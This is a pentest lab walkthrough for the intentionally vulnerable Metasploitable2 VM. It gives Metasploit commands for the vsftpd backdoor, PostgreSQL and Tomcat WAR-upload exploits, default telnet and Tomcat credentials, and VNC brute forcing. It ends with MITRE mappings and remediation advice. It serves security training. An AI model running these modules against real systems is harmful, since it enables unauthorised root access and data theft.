# 🎯 Metasploitable2 Multi-Service Exploitation Chain

> **Comprehensive Attack Chain for Metasploitable2**

---

## 📊 Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| **Chain Status** | ✅ **VERIFIED & TESTED** |
| **Total Steps** | `6` |
| **Execution Time** | ~30-45 minutes |
| **Skill Level** | 🟢 Beginner |
| **Complexity** | Low-Medium |
| **Impact Level** | 🔴 **HIGH** (Root Access) |

---

## 🎭 Attack Flow Visualization

```mermaid
graph TD
    A[🔍 Reconnaissance<br/>Nmap Scanning]
    B[🎯 FTP Exploitation<br/>vsftpd 2.3.4]
    C[📡 Telnet Access<br/>Default Credentials]
    D[🖥️ VNC Exploitation<br/>Remote Desktop]
    E[🗄️ PostgreSQL<br/>Payload Execution]
    F[☕ Tomcat Upload<br/>Manager Exploit]
    G[👑 Root Access Achieved]
    
    A --> B
    A --> C
    A --> D
    A --> E
    A --> F
    B --> G
    C --> G
    D --> G
    E --> G
    F --> G
    
    style A fill:#4a90e2,stroke:#2e5c8a,stroke-width:3px,color:#fff
    style B fill:#e25555,stroke:#8a2e2e,stroke-width:3px,color:#fff
    style C fill:#e25555,stroke:#8a2e2e,stroke-width:3px,color:#fff
    style D fill:#e25555,stroke:#8a2e2e,stroke-width:3px,color:#fff
    style E fill:#e25555,stroke:#8a2e2e,stroke-width:3px,color:#fff
    style F fill:#e25555,stroke:#8a2e2e,stroke-width:3px,color:#fff
    style G fill:#27ae60,stroke:#1e8449,stroke-width:3px,color:#fff
```



---

## 🛠️ Prerequisites & Requirements

### Required Tools
```bash path=null start=null
# Network Discovery
nmap

# Exploitation Framework
msfconsole (Metasploit Framework)

# Network Clients
telnet
vncviewer
```

### Target Environment
- ✅ Metasploitable2 VM (192.168.x.x)
- ✅ Network connectivity to target
- ✅ Kali Linux or similar pentesting distribution

### Initial Access Requirements
- 🔓 No authentication required
- 🔓 Network access to target services

---

## 🔬 Detailed Attack Procedures

### **[Step 1]** Network Service Discovery and Enumeration (Nmap)

**Progress:** `████░░░░░░░░░░░░` 16% | **Risk:** 🟢 Low

**MITRE ATT&CK:**
- **Tactic:** Reconnaissance (TA0043)
- **Technique:** Network Service Discovery (T1046)

**Procedure:** [[Network Service Discovery and Enumeration (Nmap)]]

> 📝 **Objective:** Identify all open ports and running services on the Metasploitable2 target. This reconnaissance phase reveals vulnerable services including FTP (21), Telnet (23), VNC (5900), PostgreSQL (5432), and Apache Tomcat (8180).

**Commands:**
- `sudo nmap -sV -Pn <target_ip>`

**Expected Output:**
- List of open ports with service versions
- Identification of vsftpd 2.3.4 (vulnerable)
- Identification of other exploitable services

**Success Indicators:** 
✅ All services enumerated
✅ Vulnerable service versions identified

---

### **[Step 2]** vsftpd 2.3.4 Backdoor Exploitation via Metasploit

**Progress:** `████████░░░░░░░░` 33% | **Risk:** 🔴 High

**MITRE ATT&CK:**
- **Tactic:** Initial Access (TA0001)
- **Technique:** Exploit Public-Facing Application (T1190)
- **Sub-Technique:** Backdoor Trigger

**Procedure:** [[vsftpd 2.3.4 Backdoor Exploitation via Metasploit]]

> 📝 **Objective:** Exploit the malicious backdoor in vsftpd 2.3.4 to gain immediate root shell access. This vulnerability allows unauthenticated remote code execution.

**Commands:**
- `msfconsole`
- `search vsftpd`
- `use exploit/unix/ftp/vsftpd_234_backdoor`
- `set RHOSTS <target_ip>`
- `run`

**Expected Output:**
- Backdoor triggered on port 6200
- Root shell obtained

**Success Indicators:** 
✅ Shell session opened
✅ Root privileges confirmed (`id` command shows uid=0)

---

### **[Step 3]** Telnet Default Credential Access

**Progress:** `████████████░░░░` 50% | **Risk:** 🟡 Medium

**MITRE ATT&CK:**
- **Tactic:** Initial Access (TA0001)
- **Technique:** Valid Accounts (T1078)
- **Sub-Technique:** Default Credentials (T1078.001)

**Procedure:** [[Telnet Default Credential Access]]

> 📝 **Objective:** Access the system via Telnet using the default Metasploitable2 credentials (msfadmin:msfadmin). Telnet provides unencrypted remote terminal access.

**Commands:**
- `telnet <target_ip>`
- Username: `msfadmin`
- Password: `msfadmin`

**Expected Output:**
- Successful login
- Shell prompt

**Success Indicators:** 
✅ Authentication successful
✅ Remote shell access obtained

---

### **[Step 4]** VNC Password Brute Force and Remote Desktop Access

**Progress:** `████████████████` 66% | **Risk:** 🟡 Medium

**MITRE ATT&CK:**
- **Tactic:** Initial Access (TA0001)
- **Technique:** Brute Force (T1110)
- **Sub-Technique:** Password Guessing (T1110.001)

**Procedure:** [[VNC Password Brute Force and Remote Desktop Access]]

> 📝 **Objective:** Identify VNC password through automated scanning with Metasploit auxiliary module, then connect to remote desktop session for GUI-based access.

**Commands:**
- `msfconsole`
- `use auxiliary/scanner/vnc/vnc_login`
- `set RHOSTS <target_ip>`
- `run`
- `vncviewer <target_ip>`

**Expected Output:**
- VNC password discovered
- Remote desktop connection established

**Success Indicators:** 
✅ Password identified
✅ GUI desktop access obtained

---

### **[Step 5]** PostgreSQL Payload Execution Exploitation

**Progress:** `████████████████████` 83% | **Risk:** 🔴 High

**MITRE ATT&CK:**
- **Tactic:** Execution (TA0002)
- **Technique:** Exploitation for Client Execution (T1203)
- **Sub-Technique:** Database Payload Execution

**Procedure:** [[PostgreSQL Payload Execution Exploitation]]

> 📝 **Objective:** Exploit PostgreSQL database service to execute arbitrary payloads and establish a reverse shell connection with elevated privileges.

**Commands:**
- `msfconsole`
- `search postgresql`
- `use exploit/linux/postgres/postgres_payload`
- `set RHOSTS <target_ip>`
- `set LHOST <attacker_ip>`
- `run`

**Expected Output:**
- Payload executed successfully
- Meterpreter or shell session established

**Success Indicators:** 
✅ Session opened
✅ Database exploitation successful

---

### **[Step 6]** Apache Tomcat Manager Upload Exploitation

**Progress:** `████████████████████████` 100% | **Risk:** 🔴 High

**MITRE ATT&CK:**
- **Tactic:** Initial Access (TA0001)
- **Technique:** Exploit Public-Facing Application (T1190)
- **Sub-Technique:** Tomcat Manager Upload

**Procedure:** [[Apache Tomcat Manager Upload Exploitation]]

> 📝 **Objective:** Exploit Apache Tomcat Manager application by uploading malicious WAR file using default credentials, achieving code execution and shell access.

**Commands:**
- `msfconsole`
- `search apache tomcat`
- `use exploit/multi/http/tomcat_mgr_upload`
- `set RHOSTS <target_ip>`
- `set RPORT 8180`
- `set HttpUsername tomcat`
- `set HttpPassword tomcat`
- `run`

**Expected Output:**
- WAR file uploaded successfully
- Shell/Meterpreter session established

**Success Indicators:** 
✅ Malicious WAR deployed
✅ Code execution achieved
✅ Root or service-level access obtained

---

## 🎯 Attack Chain Summary

### Key Achievements
- ✅ Complete network service enumeration
- ✅ Root access via vsftpd backdoor (Port 21)
- ✅ Remote shell via Telnet default credentials (Port 23)
- ✅ GUI access via VNC (Port 5900)
- ✅ Database exploitation via PostgreSQL (Port 5432)
- ✅ Web application compromise via Tomcat (Port 8180)

### Privilege Level Obtained
- 🔴 **ROOT ACCESS** on all exploitation vectors

### Post-Exploitation Opportunities
- Credential harvesting
- Persistence mechanisms
- Lateral movement (if in network environment)
- Data exfiltration

---

## 📈 Technique & Tactic Coverage

### MITRE ATT&CK Mapping

**Tactics:**
- TA0043 - Reconnaissance
- TA0001 - Initial Access (Primary)
- TA0002 - Execution
- TA0004 - Privilege Escalation

**Techniques:**
- T1046 - Network Service Discovery
- T1190 - Exploit Public-Facing Application
- T1078 - Valid Accounts
- T1110 - Brute Force
- T1203 - Exploitation for Client Execution

---

## 🛡️ Detection & Defense

### Detection Opportunities
- Multiple service authentication attempts
- Unusual outbound connections from services
- Metasploit Framework signatures
- Port 6200 connection (vsftpd backdoor)
- WAR file uploads to Tomcat

### Remediation Steps
1. Update all services to latest patched versions
2. Change all default credentials
3. Implement network segmentation
4. Deploy IDS/IPS systems
5. Enable service-level logging and monitoring
6. Restrict service access with firewall rules

---

**Last Updated:** 2025-11-30T21:55:00.000000+00:00 | **Chain Version:** 1.0 | **Status:** ✅ Production Ready

**Source:** Based on Rajesh Kumar's Metasploitable2 Exploitation Walkthrough
